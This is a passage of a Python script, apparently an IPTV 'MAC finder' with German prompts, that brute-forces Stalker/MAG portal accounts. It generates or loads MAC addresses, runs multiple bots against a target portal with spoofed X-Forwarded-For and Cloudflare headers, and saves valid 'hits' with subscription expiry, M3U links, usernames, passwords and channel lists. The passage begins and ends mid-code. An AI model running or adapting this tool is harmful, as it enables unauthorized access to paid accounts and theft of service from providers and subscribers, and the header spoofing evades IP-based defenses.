        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
        # Add more user agents as needed
    ]

    # Select a random country code
    random_country_code = random.choice(country_codes)

    # Select a random user agent
    random_user_agent = random.choice(user_agents)

    # Generate a random CF-RAY value
    cf_ray = uuid.uuid4().hex[:12]

    # Generate a random CF-Visitor value
    cf_visitor = 'http'  #f"{'http' if random.random() < 0.5 else 'https'}"

    # Generate a random Accept header
    accept_header = f"text/html,application/xhtml+xml,application/xml;q=0.{random.randint(1, 9)}"

    # Generate a random Accept-Language header
    accept_language_header = f"{random.choice(['en-US', 'fr-FR', 'de-DE', 'es-ES'])};q=0.{random.randint(1, 9)}"

    # Generate a random Accept-Encoding header
    accept_encoding_header = f"gzip, deflate;q=0.{random.randint(1, 9)}"

    # Create the random HTTP header
    header = {
        "CF-IPCountry": random_country_code,
        "CF-RAY": cf_ray,
        "User-Agent": random_user_agent,
        "Accept": accept_header,
        "Accept-Language": accept_language_header,
        "Accept-Encoding": accept_encoding_header,
        "CF-Visitor": cf_visitor,
        "Connection": "keep-alive",
        "Referer": httpX+panell,
        "Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe/Paris;" if portal_idx=="stalker_portal/server/load.php" else f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }

    # Create a string header from the dictionary
    header_string = "\r\n".join(f"{key}: {value}" for key, value in header.items())
    return header_string

res:str  = ""
def check_panel_info(host):
    global country_name, scountry, sip, sname, res
    host= host.split(':')[0]
    check_url = f"https://ipleak.net/json/{host}"
    max_attempts=4
    attempt=1
    while attempt<max_attempts:
        try:
            ses = requests.Session()
            res = ses.get(check_url, timeout=5, verify=False)
            break
        except:
            attempt +=1
            time.sleep(0.5)

    try:
        cont = str(res.text)
        if not 'title' in cont:
            sip = cont.split('ip": "')[1]
            sip = sip.split('"')[0]
            sname = cont.split('"isp_name": "')[1]
            sname = sname.split('"')[0]
            country_name = cont.split('country_name": "')[1]
            country_name = str(
                (country_name.split('"')[0]).encode('utf-8').decode("unicode-escape"))
            scountry = cont.split('country_code": "')[1]
            scountry = scountry.split('"')[0]
    except:
        pass

"""
# Aufruf Auswahl Portal-Typ
 portal_idx = get_portal_idx()
"""
auto_typ2 = auto_typ[1:]
portal_idx = auto_typ2
clear_screen()
print(plogo)

channel_cat = "0"
totLen = "000000"
mac_file = ""
# MAC Präfix Tabelle
mac_pref = ('00:1A:79:',
            '00:04:0E:',
            '00:07:BA:',
            '00:0C:29:',
            '00:0D:4B:',
            '00:0D:67:',
            '00:1A:4D:',
            '00:1A:92:',
            '00:1B:79:',
            '00:1C:19:',
            '00:1C:79:',
            '00:1D:7E:',
            '00:1E:67:',
            '00:1F:33:',
            '00:2A:01:',
            '00:2A:79:',
            '00:22:55:',
            '00:23:DF:',
            '00:24:D4:',
            '00:25:9C:',
            '00:26:AD:',
            '00:27:22:',
            '00:30:DA:',
            '00:32:2D:',
            '00:33:44:',
            '00:40:96:',
            '00:50:F2:',
            '00:55:93:',
            '00:90:9F:',
            '00:1C:1D:',
            '00:A1:79:',
            '00:AA:88:',
            '00:AC:00:',
            '04:D6:AA:',
            '04:DB:56:',
            '04:F9:38:',
            '08:00:27:',
            '08:62:66:',
            '0C:47:C9:',
            '10:27:BE:',
            '11:22:00:',
            '11:33:01:',
            '18:C8:E7:',
            '1A:00:6A:',
            '1A:00:FB:',
            '32:2D:D1:',
            '33:44:CF:',
            '55:93:EA:',
            '74:1A:79:',
            'A0:BB:3E:',
            'D0:9F:D9:',
            'D4:CF:F9:',
            'FC:A1:83:',
            'FF:1A:79:')

combo_dir = rootDir + 'combo/'
files = [f for f in os.listdir(combo_dir) if os.path.isfile(os.path.join(combo_dir, f))]
count1 = len(files)
dsy = '\n\33[1;4;94;47m 0=> Zufälliger MAC  \33[0m\n'
for i, file in enumerate(files, 1):
    dsy += f' {i}=> {file}\n'

print(f"""\nWähle eine Option!
{dsy}
\33[33mIch habe {count1} MAC Combos gefunden!
    """)

mac_choice = input("\33[1;91m[\33[0m?\33[1;91m]\33[0m Deine Auswahl [Default 0]= \33[0m") or "0"
count1 = 0

if mac_choice == "0":
    clear_screen()
    print(plogo)
    print('\n')

    gen_idx = str(mac_pref)
    gen_idx = (gen_idx.count(',') + 1)
    for xd in range(0, gen_idx):
        tire = '  > '
        if int(xd) < 9:
            tire = '   > '
        print(str(xd + 1) + tire + mac_pref[xd])

    mac_select = input("\n\33[1;91m[\33[0m?\33[1;91m]\33[0m Wähle einen MAC-Typ [Default 1]= ") or "1"
    mac_select = mac_pref[int(mac_select) - 1]

    clear_screen()
    print(plogo)
    mac_total = input("""
MAC-Nummer generieren?
[Default: 2000000]
\33[1;91m[\33[0m?\33[1;91m]\33[0m Anzahl MAC´s = """)
    if mac_total == "":
        mac_total = 2000000
    mac_total = int(mac_total)
    # print(mac_total)
else:
    for files in os.listdir(combo_dir):
        count1 = count1 + 1
        if mac_choice == str(count1):
            mac_file = (combo_dir + files)
            break
    count1 = 0
    if not mac_file == "":
        print("lade Combo: "+ mac_file)
    else:
        clear_screen()

        print("Falsche Wahl der Mac-Kombination!")
        quit()

    c = open(mac_file, encoding='utf-8')
    totLen = c.readlines()
    mac_total = (len(totLen))

clear_screen()
print(plogo)

botcount = input("""
    \33[1;96mWählen Sie die Anzahl der Bots!
    \33[0m
    \33[1;33mMuss zwischen 1 und 15 liegen!\33[0m

\33[1;91m[\33[0m?\33[1;91m]\33[0m Anzahl der Bots [Default 2] = """)
clear_screen()
print(plogo)
if botcount == "":
    botcount = "2"
if int(botcount) > 15:
    botcount = "15"

botcount = int(botcount)

channel_cat = input("""\n\33[0m
 Was möchten Sie in den Ergebnissen zeigen?

    0 > Nur Verbindungsinformationen
    1 > Nur Kanäle
    2 > Alle (LIVE-VOD-SERIES)   

\33[1;91m[\33[0m?\33[1;91m]\33[0m Deine Auswahl [Default 2]= """)
if channel_cat == "":
    channel_cat = "2"
if int(channel_cat) > 2:
    channel_cat = "2"

if panel == "":
    panel = "mol-2.com:8080"

Rhit = '\33[33m'
Ehit = '\033[0m'
if not panel == '':
    panel = panel.replace(" ", "")
panel = (panel
         .replace(httpX, "")
         .replace("/c", "")
         .replace("/", "")
         .replace('stalker_portal', '/stalker_portal'))

ip = ""
fname = ""
adult = ""
play_token = ""
acount_id = ""
stb_id = ""
stb_type = ""
sespas = ""
stb_c = ""
timezon = ""
tloca = ""

clear_screen()
print(plogo)

# Datum für Hit-File
timestamp = datetime.now()
timestamp_= str(timestamp.strftime('%d_%m_%Y'))
hit_file_f = rootDir + "Hits/" + "Portal_" + panel.replace(":", "_").replace('/', '') + "{"+timestamp_+"}@🅕🅞🅧🅨🅜🅐🅒🅢🅒🅐🅝.txt"
hit_file_f_vpn = rootDir + "Hits/" + "Portal_VPN_" + panel.replace(":", "_").replace('/', '') + "{"+timestamp_+"}@🅕🅞🅧🅨🅜🅐🅒🅢🅒🅐🅝.txt"
count1: int = 1


# Routine Hit Speichern in Datei ohne VPN und Datei mit VPN
def yax(hits):
    global duru, rootDir,panel

    hit_file_f = rootDir + "Hits/" + "Portal_" + panel.replace(":", "_").replace('/',
                                                                                 '') + "{" + timestamp_ + "}@🅕🅞🅧🅨🅜🅐🅒🅢🅒🅐🅝.txt"
    hit_file_f_vpn = rootDir + "Hits/" + "Portal_VPN_" + panel.replace(":", "_").replace('/',
                                                                                         '') + "{" + timestamp_ + "}@🅕🅞🅧🅨🅜🅐🅒🅢🅒🅐🅝.txt"
    file_path = hit_file_f if duru == "🎯" else hit_file_f_vpn
    with open(file_path, 'a+', encoding='utf-8') as hit_file:
        hit_file.write(hits)
        hit_file.close()
        hitr = "\33[1;33m"


def remove_duplicates(combo_file):
    with open(combo_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    unique_lines = list(dict.fromkeys(lines))  # preserve original order
    with open(combo_file, 'w', encoding='utf-8') as file:
        file.writelines(unique_lines)

def write_all_mac_combo(hit_mac):
    global  rootDir
    combo_file = rootDir + "combo/Foxy_MAC_combo.txt"
    with open(combo_file, 'a+', encoding = 'utf-8') as file:
        macs = file.readlines()
        if hit_mac + "\n" not in macs:
            file.write(hit_mac + "\n")
        file.close()
    remove_duplicates(combo_file)

def write_mac_combo(mac):
    global  panel, rootDir
    hit_mac = mac
    combo_file = rootDir + "combo/" + "Portal_" + panel.replace(":", "_").replace('/', '') + "combo.txt"
    with open(combo_file, 'a+', encoding = 'utf-8') as file:
        macs = file.readlines()
        if hit_mac + "\n" not in macs:
            file.write(hit_mac + "\n")
        file.close()
    remove_duplicates(combo_file)



def unicode(fyz):
    cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
    return cod

def duzel2(veri,vr):
    data=""
    try:
        data=veri.split('"'+str(vr)+'":"')[1]
        data=data.split('"')[0]
        data=data.replace('"','')
        data=unicode(data)
    except:pass


def tarih_clear(trh: str) -> int:
    global hitoff

    month_string_to_number = {m: str(i) for i, m in enumerate(
            ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"], start=1)}
    day, month_year = trh.split(', ')
    day, (month, year) = int(day), month_year.split()
    month, year = int(month_string_to_number[month]), int(year)
    time_diff = (datetime(year, month, day)-datetime.now()).days
    hitoff += time_diff < 0
    return time_diff


macs = ""

# Routine zufällige MAC
def randommac():
    macs = set()
    while True:
        mac = str(mac_select) + "%02x:%02x:%02x" % (
            (random.randint(0, 256)), (random.randint(0, 256)), (random.randint(0, 256)))
        mac=mac.replace(':100', ':10')
        mac=mac.upper()
        if mac not in macs:
            macs.add(mac)
            return mac


# URLs für Portal-Abfrage
url1 = httpX + panel + "/" + portal_idx + "?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"

url2 = httpX + panel + "/" + portal_idx + "?type=stb&action=get_profile&JsHttpRequest=1-xml" #"?type=stb&action=get_profile&JsHttpRequest=1-xml"

url3 = httpX + panel + "/" + portal_idx + "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

url5 = httpX + panel + "/" + portal_idx + "?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/94067_&JsHttpRequest=1-xml"
url6 = httpX + panel + "/" + portal_idx + "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
url7 = httpX + panel + "/" + portal_idx + "?type=itv&action=get_ordered_list&force_ch_link_check=&fav=0&sortby=number&hd=0&p=1&JsHttpRequest=1-xml"
url8 = httpX + panel + "/" + portal_idx + "?type=vod&action=get_ordered_list&force_ch_link_check=&fav=0&sortby=number&hd=0&p=1&JsHttpRequest=1-xml"
url9 = httpX + panel + "/" + portal_idx + "?type=series&action=get_ordered_list&force_ch_link_check=&fav=0&sortby=number&hd=0&p=1&JsHttpRequest=1-xml"

liveurl = httpX + panel + "/" + portal_idx + "?type=itv&action=get_genres&JsHttpRequest=1-xml"

vodurl = httpX + panel + "/" + portal_idx + "?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl = httpX + panel + "/" + portal_idx + "?action=get_categories&type=series&JsHttpRequest=1-xml"


def url(cid):
    global httpX
    urlcid = httpX + panel + "/" + portal_idx + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + str(
        cid) + "_&series=&fforced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
    return urlcid


def generate_random_ip():
    """Generate a random IPv4 address."""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"


def hea1(mac, uagent):
    global httpX
    macs = mac.upper()
    macs = urllib.parse.quote(mac)

    if portal_idx=="stalker_portal/server/load.php":
        panell = panel+'/stalker_portal/'
    else:
        panell = panel

    random_ip = generate_random_ip()

    headera = {
        'User -Agent': uagent,
        "Referer": httpX+panell,
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "Host": urllib.parse.urlparse(httpX+panell).netloc,
        "NEL": '{"success_fraction":0,"report_to":"cf-nel","max_age":604800}',
        "Pragma": "no-cache",
        "x-proxy-cache": "MISS",
        'X-Forwarded-For': random_ip,
        'CF-Connecting-IP': random_ip,
        'X-Real-IP': random_ip
        }
    """        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",  # Do Not Track
        'CF-Connecting-IP': random_ip,
        'X-Forwarded-For': random_ip,
        'X-Real-IP': random_ip, 
        """

    return headera


# Definition Header 2. Portal Anfrage mit Token
def hea2(mac: str, token: str, portal_idx: str) -> dict:
    global uagentp, uagent
    global httpX
    """
    Create a dictionary of HTTP headers for accessing the portal.php or server/load.php endpoint.

    Args:
    mac (str): The MAC address.
    token (str): The authorization token.
    portal_idx (str): The portal index (either "portal.php" or "stalker_portal/server/load.php").

    Returns:
    dict: A dictionary of HTTP headers.
    """
    macs = mac.upper()
    macs = urllib.parse.quote(mac)

    if portal_idx == "stalker_portal/server/load.php":
        user_agent = uagentp
        referer = httpX + panel + "/stalker_portal/"
    else:
        user_agent = uagentp
        referer = httpX + panel #+ "/c/"

    headerd = {
        'User-Agent': user_agent,
        "Referer": referer,
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;" if portal_idx == "stalker_portal/server/load.php" else f"mac={mac}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": f"Bearer {token}",
        "CF-IPCountry": "US",
        "CF-Request-ID": "01GFXQJRYQJ7W0X1VWGV",
        "CF-RAY": "6f3c7b5f9f9f1234",
    }

    return headerd


# Definition Header Portal Anfrage ob VPN ja/nein nutzt
def hea3(panel: str):
    """
    Create a dictionary of HTTP headers for accessing the portal.php or server/load.php endpoint.

    Args:
    panel (str): The URL of the panel or server/load.php endpoint.

    Returns:
    dict: A dictionary of HTTP headers.
    """
    return {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
        "CF-IPCountry": "US",
        "CF-Request-ID": "01GFXQJRYQJ7W0X1VWGV",
        "CF-RAY": "6f3c7b5f9f9f1234",
    }


hitcount = 0
country_name = ""
scountry = ""
sip = ""
sname = ""

# Definition Hitausgabe für Datei
def hit(mac, trh, real, m3ulink, p_message, vpn, livelist, vodlist, serieslist, playerapi, live_count, film_count, series_count):
    global hitr, hitoff
    global hitcount, country_name, scountry, sip, sname
    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()
    SG =SNCUT+ '+'+mac
    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
    SINGENC = SING.upper()

    try:
        imza = """
    𝑴𝑨𝑪 𝑭𝒊𝒏𝒅𝒆𝒓 𝑷𝒓𝒐 """ + version + """
╭─➨ HIT INFO ● Scan: [""" + str(scan_date) + """]   
├● 𝐑𝐞𝐚𝐥 ➨ """ + str(real) + """
├● 𝐏𝐚𝐧𝐞𝐥 ➨ """+ httpX + str(panel) + """/c/
├● 𝐌𝐀𝐂 ➨ """ + str(mac) + """
├● 𝐄𝐱𝐩 ➨ """ + str(trh) + """
├● 𝐈𝐦𝐚𝐠𝐞 ➨ """ + str(p_message) + """
├● 𝐕𝐩𝐧 ➨ """ + str(vpn) + """""" + str(playerapi) + """
╰─● 𝐌𝟑𝐮𝐋𝐢𝐧𝐤 ➨ """ + str(m3ulink) + """
╭───𝐃𝐞𝐯𝐢𝐜𝐞 𝐈𝐧𝐟𝐨────────
├●𝐒𝐍𝐂𝐔𝐓\t\t➩ """+str(SNCUT)+"""
├●𝐒𝐍\t\t➩ """+str(SNENC)+"""
├●𝐃𝐄𝐕𝐈𝐂𝐄𝟏\t➩ """ +str(DEVENC)+"""
├●𝐃𝐄𝐕𝐈𝐂𝐄𝟐\t➩ """ +str(SINGENC)+"""
╰──────────────────────
╭───𝐒𝐞𝐫𝐯𝐞𝐫 𝐈𝐧𝐟𝐨────────────
├●𝐂𝐨𝐮𝐧𝐭𝐫𝐲 \t➩ """  + str(country_name) + """ ✮ """ + str(scountry) + """
├●𝐒𝐞𝐫𝐯𝐞𝐫 𝐈𝐏\t➩ """ + str(sip) + """
├●𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞➩ """ + str(sname) + """
╰────────────────────────
╭───𝐌𝐞𝐝𝐢𝐚 𝐈𝐧𝐟𝐨─────────
├●𝐋𝐢𝐯𝐞𝐓𝐕\t➩ """ + str(live_count.replace('"', '')) + """
├●𝐕𝐨𝐝  \t➩ """ + str(film_count.replace('"', '')) + """
├●𝐒𝐞𝐫𝐢𝐞𝐬\t➩ """ + str(series_count.replace('"', '')) + """
╰──────────────────────
╭─➨ 𝐒𝐜𝐚𝐧𝐝𝐚𝐭𝐞𝐧 ─────────
├● 𝐏𝐚𝐧𝐞𝐥-𝐓𝐲𝐩: [""" + portal_idx + """]
╰──────────────────────
   ➨𝑯𝒊𝒕𝒔 𝒃𝒚 """ + str(nick) + """     
        """
        if channel_cat == "1" or channel_cat == "2":
            imza = imza + """
╭─●🅻🅸🆅🅴 🅻🅸🆂🆃
╰─➨ ««◌»» """ + str(livelist) + """ """
        if channel_cat == "2":
            imza = imza + """
╭─●🆅🅾🅳 🅻🅸🆂🆃
╰─➨ ««◌»» """ + str(vodlist) + """
╭─●🆂🅴🆁🅸🅴🆂 🅻🅸🆂🆃
╰─➨ ««◌»» """ + str(serieslist) + """
    𝙗𝙮 𝙁𝙤𝙭𝙮 𝙆𝙧𝙤𝙣𝙛𝙚𝙡𝙙 [ https://t.me/Foxy_Kr ]
"""
        yax(imza)
        hitcount = hitcount + 1
        print(imza)
        if hitcount >= hitc:
            hitr = "\33[1;33m"
    except:
        pass


cpm = 0
cpmx = 0
hitr = "\33[1;33m"
no_vpn_count: int = 0
use_vpn_count: int = 0
off_m3u_count: int = 0

def data_server(scountry):
    flag = ''
    for char in scountry:
        flag += chr(ord(char) + 127397)
    flag = flag.upper()
    origen= f"{flag} {scountry}"
    return origen

# Define a constant for the pause duration
""" constant_pause = 100 """

#width = os.get_terminal_size().columns
# Definition Ausgabe Scan-Fortschritt
def echok(mac, bot, total, hitc, oran, tokenr):
    global cpm,cpmx,host,sip, sname
    global hitr, httpX, hitoff
    global uagentp, uagent, mac_file, mac_choice, mac_total
    global no_vpn_count, use_vpn_count, off_m3u_count
    try:
        cpmx = time.perf_counter()
        laufzeit = int( 60 / (cpmx - cpm) )
        """
        # Check if runtime is less than constant_pause and pause if necessary
        if laufzeit > constant_pause:
            pause_duration = (laufzeit - constant_pause*0.67) / 60  # Convert seconds to minutes
            print(f"Pausing for {pause_duration:.2f} seconds...")
            time.sleep(pause_duration )  # Convert back to seconds for sleep
        """
        response = requests.get(
             httpX + panel + "/"+ portal_idx + "?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml",
            allow_redirects=False)
        if mac_choice == "0":
            mac_choicex = "Random MAC"
        else:
            mac_choicex = mac_file
        if sip == "":
            check_panel_info(panel)

        echo = ("""
 ╭── Mac Finder Pro """+ str(version)+""" ────
 ├● \33[1;4;37mP:\33[0m\33[1;7m """ + str(panel)  + """\33[0m 
 ├── Server Info ─────────────
 ├ \33[1;37m""" + str(sip)+ """\33[0m
 ├ \33[1;37m""" + str(sname[0:32])+"""\33[0m
 ├ \33[1;37m""" + str(country_name or "not info")+"""/ """+str(data_server(scountry) or ".")+"""\33[0m
 ├─● """ + tokenr + str(mac) + """\33[0m
 ├─● \33[36mTotal> """ + str(total) + """\33[0m / """ +str(mac_total)+"""  \33[1;31m"""+str(oran) + """ %\33[0m
 ├─● """+ str(mac_choicex[0:32])+"""...\33[0m
 ├──●\33[94m  CPM> """ + f"{laufzeit}"+(" " * (6 - len(str(laufzeit)))) + """\33[1;32m""" + str(bot) +"""\33[0m
 ├──● """ + str(hitr) + """ Hit> """ + str(hitc) + """\33[0m
 ├──● \33[1;32m NoVPN: """ + str(no_vpn_count) + """\33[1;31m VPN: """ + str(use_vpn_count) + """ noM3U: """ + str(
            off_m3u_count) + "\33[37m OFF: "+ str(hitoff)+"""\33[0m
 ├● Portal Type: [""" + str(portal_idx) + """]
 ├● \33[1;37mUA:[""" + uagentp + """]\33[0m
 ╰─● HTTP Request: """ + str(color_code(response.status_code)) + str(response.status_code) + """\33[0m ●─────────────\n""")
        print(echo, end = "", flush = True)
        cpm = time.perf_counter()
    except:
        pass


def vpnip(ip: str) -> str:
    """
    Get VPN information from IP API.

    Args:
    ip (str): The IP address to query.

    Returns:
    str: The VPN information in the format "Country/City" or "Not Invalid" if the IP is invalid.
    """
    url = f'https://ipapi.co/{ip}/json/'  # You can use other APIs like http://ip-api.com/json/{ip} or https://freegeoip.app/json/
    try:
        response = requests.get(url, timeout=5)  # Set a timeout to avoid waiting indefinitely
        response.raise_for_status()  # Raise an exception for bad status codes
        data = response.json()
        country_name = data.get('country_name')
        city = data.get('city')
        if country_name and city:
            vpn = f"{country_name}/{city}"
        else:
            vpn = "Not Invalid"
    except (requests.RequestException, ValueError, KeyError):
        vpn = "Not Invalid"
    return vpn

duru = ""
# Abfrage Nutzung VPN des Hits
def goruntu(link):
    global no_vpn_count, use_vpn_count, duru
    try:
        ses = requests.Session()
        res = ses.get(link, headers=hea3(panel), timeout=10, allow_redirects=False, stream=True)
        duru = "𝙑𝙋𝙉「 USE 」🔒✔ "
        if res.status_code == 302:
            duru = "🎯"
            no_vpn_count = no_vpn_count + 1
        else:
            use_vpn_count = use_vpn_count + 1
    except:
        duru = "𝙑𝙋𝙉「 USE 」🔒✔ "
    return duru

tokenr = "\33[0m"

# Bildschirmmeldung Hit
def hitprint(mac, trh):
    print('      💥💥️ HIT 💥️💥    \n  ' + str(mac) + '\n  ' + str(trh))

# Routine Abfrage Inhalte des Hits
def chlist(listlink, mac, token, livel):
    global kanal
    kategori = ""
    veri: str = ""
    max_attempts = 4
    attempt = 1
    while attempt < max_attempts:
        try:
            res = ses.get(listlink, headers = hea2(mac, token, portal_idx), timeout = 20, verify = False)
            veri = str(res.text)
            break
        except:
            attempt += 1
            time.sleep(0.5)

    if veri.count('title":"') > 0:
        for i in veri.split('title":"'):
            try:
                kanal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/')
            except:
                pass
            kategori = kategori + kanal + livel
            kategori = kategori.replace("{ ««◌»» ", " ««◌»» ")
    list = kategori
    return list

def extract_value(veri, key, is_timestamp=False):
    try:
        value = veri.split(f'{key}":')[1].split(',')[0].replace('"', "")
        if is_timestamp and value != "null":
            return datetime.datetime.fromtimestamp(int(value)).strftime('%d-%m-%Y %H:%M:%S')
        return value
    except IndexError:
        return None

# Routine Abfrage m3u-Link und Daten
def m3uapi(playerlink, macs, token):
    global veri, httpX
    mt = ""
    attempt = 1
    while attempt < 6:
        try:
            ses = requests.Session()
            res = ses.get(playerlink, headers=hea2(macs, token, portal_idx), timeout=10, verify=False)
            veri = str(res.text)
            break
        except:
            attempt += 1
            time.sleep(1)

    try:
        if 'active_cons' in veri:
            acon = extract_value(veri, 'active_cons')
            mcon = extract_value(veri, 'max_connections')
            status = extract_value(veri, 'status')
            timezone = extract_value(veri, 'timezone')
            realm = extract_value(veri, 'url')
            port = extract_value(veri, 'port')
            userm = extract_value(veri, 'username')
            pasm = extract_value(veri, 'password')
            bitism = extract_value(veri, 'exp_date', is_timestamp=True)
            if bitism == "null":
                bitism = "Unlimited"
            message = extract_value(veri, 'message')

            mt = ("""
├● Message ➠ """ + str(message) + """ 
├● Host ➠ """ + httpX + panel + """/c/
├● Real ➠ """ + httpX + realm + """:""" + port + """/c/
├● Port ➠ """ + port + """
├● User ➠ """ + userm + """
├● Pass ➠ """ + pasm + """
├● Exp ➠ """ + bitism + """ 
├● Act Con ➠ """ + acon + """
├● Max Con ➠ """ + mcon + """ 
├● Status ➠ """ + status + """
├● TimeZone ➠ """ + timezone + """ """)
    except:
        pass
    return mt

country_flags = {
        " AL ": " 🇦🇱 AL ",
        " AU ": " 🇦🇺 AU ",
        " UK ": " 🇬🇧 UK ",
        " US ": " 🇺🇸 US ",
        " DE ": " 🇩🇪 DE ",
        " AFG ": " 🇦🇫 AFG ",
        " AX ": " 🇦🇽 AX ",
        " ALB ": " 🇦🇱 ALB ",
        " DZ ": " 🇩🇿 DZ ",
        " AS ": " 🇦🇸 AS ",
        " AD ": " 🇦🇩 AD ",
        " AO ": " 🇦🇴 AO ",
        " AI ": " 🇦🇮 AI ",
        " AQ ": " 🇦🇶 AQ ",
        " AG ": " 🇦🇬 AG ",
        " AR ": " 🇦🇪 AR ",
        " AM ": " 🇦🇲 AM ",
        " AW ": " 🇦🇼 AW ",
        " AT ": " 🇦🇹 AT ",
        " AZ ": " 🇦🇿 AZ ",
        " BS ": " 🇧🇸 BS ",
        " BH ": " 🇧🇭 BH ",
        " BD ": " 🇧🇩 BD ",
        " BB ": " 🇧🇧 BB ",
        " BY ": " 🇧🇾 BY ",
        " BE ": " 🇧🇪 BE ",
        " BZ ": " 🇧🇿 BZ ",
        " BJ ": " 🇧🇯 BJ ",
        " BM ": " 🇧🇲 BM ",
        " BT ": " 🇧🇹 BT ",
        " BO ": " 🇧🇴 BO ",
        " BA ": " 🇧🇦 BA ",
        " BW ": " 🇧🇼 BW ",
        " BV ": " 🇧🇻 BV ",
        " BR ": " 🇧🇷 BR ",
        " IO ": " 🇮🇴 IO ",
        " BN ": " 🇧🇳 BN ",
        " BG ": " 🇧🇬 BG ",
        " BF ": " 🇧🇫 BF ",
        " BI ": " 🇧🇮 BI ",
        " KH ": " 🇰🇭 KH ",
        " KU ": " 🇰🇷 KU ",
        " CM ": " 🇨🇲 CM ",
        " CA ": " 🇨🇦 CA ",
        " CV ": " 🇨🇻 CV ",
        " KY ": " 🇰🇾 KY ",
        " CF ": " 🇨🇫 CF ",
        " TD ": " 🇹🇩 TD ",
        " CL ": " 🇨🇱 CL ",
        " CN ": " 🇨🇳 CN ",
        " CX ": " 🇨🇽 CX ",
        " CC ": " 🇨🇨 CC ",
        " CO ": " 🇨🇴 CO ",
        " KM ": " 🇰🇲 KM ",
        " CG ": " 🇨🇬 CG ",
        " CD ": " 🇨🇩 CD ",
        " CK ": " 🇨🇰 CK ",
        " CR ": " 🇨🇷 CR ",
        " CI ": " 🇨🇮 CI ",
        " HR ": " 🇭🇷 HR ",
        " CU ": " 🇨🇺 CU ",
        " CY ": " 🇨🇾 CY ",
        " CZ ": " 🇨🇿 CZ ",
        " DK ": " 🇩🇰 DK ",
        " DJ ": " 🇩🇯 DJ ",
        " DM ": " 🇩🇲 DM ",
        " DO ": " 🇩🇴 DO ",
        " EZ ": " 🇪🇨 EZ ",
        " EG ": " 🇪🇬 EG ",
        " SV ": " 🇸🇻 SV ",
        " GQ ": " 🇬🇶 GQ ",
        " ER ": " 🇪🇷 ER ",
        " EE ": " 🇪🇪 EE ",
        " ET ": " 🇪🇹 ET ",
        " FK ": " 🇫🇰 FK ",
        " FO ": " 🇫🇴 FO ",
        " FJ ": " 🇫🇯 FJ ",
        " FI ": " 🇫🇮 FI ",
        " FR ": " 🇫🇷 FR ",
        " GF ": " 🇬🇫 GF ",
        " PF ": " 🇵🇫 PF ",
        " TF ": " 🇹🇫 TF ",
        " GA ": " 🇬🇦 GA ",
        " GM ": " 🇬🇲 GM ",
        " GH ": " 🇬🇭 GH ",
        " GI ": " 🇬🇮 GI ",
        " GR ": " 🇬🇷 GR ",
        " GL ": " 🇬🇱 GL ",
        " GD ": " 🇬🇵 GP ",
        " GU ": " 🇬🇺 GU ",
        " GT ": " 🇬🇹 GT ",
        " GG ": " 🇬🇬 GG ",
        " GN ": " 🇬🇳 GN ",
        " GW ": " 🇬🇼 GW ",
        " GY ": " 🇬🇾 GY ",
        " HT ": " 🇭🇹 HT ",
        " HM ": " 🇭🇲 HM ",
        " VA ": " 🇻🇦 VA ",
        " HN ": " 🇭🇳 HN ",
        " HK ": " 🇭🇰 HK ",
        " HU ": " 🇭🇺 HU ",
        " IS ": " 🇮🇸 IS ",
        " IN ": " 🇮🇳 IN ",
        " ID ": " 🇮🇩 ID ",
        " IR ": " 🇮🇷 IR ",
        " IQ ": " 🇮🇶 IQ ",
        " IE ": " 🇮🇪 IE ",
        " IM ": " 🇮🇲 IM ",
        " IL ": " 🇮🇱 IL ",
        " IT ": " 🇮🇹 IT ",
        " JM ": " 🇯🇲 JM ",
        " JP ": " 🇯🇵 JP ",
        " JE ": " 🇯🇪 JE ",
        " JO ": " 🇯🇴 JO ",
        " KZ ": " 🇰🇿 KZ ",
        " KE ": " 🇰🇪 KE ",
        " KI ": " 🇰🇮 KI ",
        " KP ": " 🇰🇵 KP ",
        " KR ": " 🇰🇷 KR ",
        " KW ": " 🇰🇼 KW ",
        " KG ": " 🇰🇬 KG ",
        " TO ": " 🇹🇴 TO ",
        " LA ": " 🇱🇦 LA ",
        " LV ": " 🇱🇻 LV ",
        " LB ": " 🇱🇧 LB ",
        " LS ": " 🇱🇸 LS ",
        " LR ": " 🇱🇷 LR ",
        " LY ": " 🇱🇾 LY ",
        " LI ": " 🇱🇮 LI ",
